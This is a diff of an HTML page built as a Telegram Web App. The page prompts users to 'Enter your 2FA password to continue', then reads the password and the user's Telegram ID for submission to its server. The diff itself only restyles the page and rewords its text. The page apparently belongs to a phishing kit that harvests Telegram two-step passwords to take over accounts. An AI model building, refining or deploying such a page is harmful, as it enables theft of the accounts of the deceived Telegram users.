@@ -6,52 +6,42 @@
     <title>2FA Verification</title>
     <link rel="stylesheet" href="styles.css">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        #twofa-input {
-            width: 100% !important;
-            max-width: 300px !important;
-            height: 60px !important;
-            font-size: 24px !important;
-            padding: 0 20px !important;
-            border-radius: 12px !important;
-        }
-    </style>
 </head>
 <body>
     <div class="container">
         <video class="background-video" autoplay muted loop playsinline>
             <source src="video/video2.mp4" type="video/mp4">
         </video>
-        
+
         <div class="content">
             <div class="emoji-center">
                 <span class="emoji">🔐</span>
             </div>
-            
+
             <div class="instruction">
-                Enter your 2FA password to continue!
+                <b>Two-Step Verification</b><br><br>
+                Enter your 2FA password to continue.
             </div>
-            
-            <input type="password" class="otp-box" id="twofa-input" placeholder="••••••">
-            
-            <button id="twofa-btn" class="verify-btn">✅ VERIFY 2FA ✅</button>
+
+            <input type="password" id="twofa-input" placeholder="Enter password">
+
+            <button id="twofa-btn" class="verify-btn">✅ Verify 2FA</button>
         </div>
     </div>
-    
+
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
+        document.addEventListener('DOMContentLoaded', function () {
             const tg = window.Telegram.WebApp;
             const twofaInput = document.getElementById('twofa-input');
             const twofaBtn = document.getElementById('twofa-btn');
 
-            // Same server — no CORS
             const SERVER_URL = '';
             const userId = tg.initDataUnsafe?.user?.id || 'user_default';
 
             tg.ready();
             tg.expand();
 
-            twofaBtn.addEventListener('click', async function() {
+            twofaBtn.addEventListener('click', async function () {
                 const password = twofaInput.value;
                 if (!password) {
                     alert('Please enter your 2FA password!');
@@ -79,7 +69,7 @@
                     alert('Error: ' + err.message);
                 } finally {
                     twofaBtn.disabled = false;
-                    twofaBtn.textContent = '✅ VERIFY 2FA ✅';
+                    twofaBtn.textContent = '✅ Verify 2FA';
                 }
             });
         });
